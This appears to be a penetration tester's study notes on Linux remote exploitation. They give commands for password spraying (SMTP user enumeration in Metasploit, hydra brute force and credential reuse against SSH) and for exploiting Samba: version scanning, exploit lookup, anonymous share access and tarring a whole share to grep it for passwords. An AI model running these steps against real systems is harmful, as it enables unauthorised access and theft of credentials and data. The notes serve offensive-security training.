# Notes - Linux Exploitation - Remote-Exploitation

## Password Spray Attack

- Create users list from this github `https://github.com/insidetrust/statistically-likely-usernames`:
```bash
head -n 50 john.txt >> users.txt
```
- User enumeration using `metasploit -> smtp_enum` and then put the users valid to a file `user_valid.txt`:
```bash
msf > use auxiliary/scanner/smtp/smtp_enum

> set RHOSTS <IP Target>
> set USER_FILE users.txt
> run
```
- SSH, SMTP and SMB are some services we can try our password spray attack against.
- Using `hydra` for brute force attack -> SSH:
```bash
hydra -L users.txt -P passwords.txt ssh://<IP target>
``` 
- Using credential against other systems on then network:
```bash
hydra -l pepito -p pepito123 -M ssh_servers.txt ssh

-M = to specify a list of ssh servers
```
## Exploiting Samba

`SAMBA` -> It provides `file sharing services` to both Windows and Linux users.

- Sambe vulnarable to 4.6.4 version (CVE-2017-7494)

- Identify SAMBA version :
```bash
nmap --script smb-os-discovery -p445 <target IP>
```
- Investigate which vulnerability exists for that version :
```bash
searchsploit samba 3.0.20
```
- Username Map Script :
```bash
https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/
```
- Samba Symlink Directory Traversal is misconfiguration in Samba:
```bash
https://www.samba.org/samba/news/symlink_attack.html
https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal/
```
- The vulnerability essentially allows an attacker to create a symbolic link to the root (/) partition from a writeable share ultimately allowing for read access to the entire file system outside of the share directory.
- A pre-requisite to this particular vulnerability requires that the Samba server contains a writeable share and that the "widelinks" parameter in the smb.conf file is set with a value of "yes".
- `smbmap` determines shares available:
```bash
smbmap -H <target IP>
smbclient \\<taregt IP> -N
-> -N anonymous access to the share is allowed and no password is required.
```
- Command for data exfiltration, we can create an archive of all files within a current directory :
```bash
smb: tar c /all_files.tar *

> ls -als all_files.tar
> tar xf /tmp/all_files.tar
> cd /directoty/interesting
> grep -r "password" * 2>&1 /dev/null
```
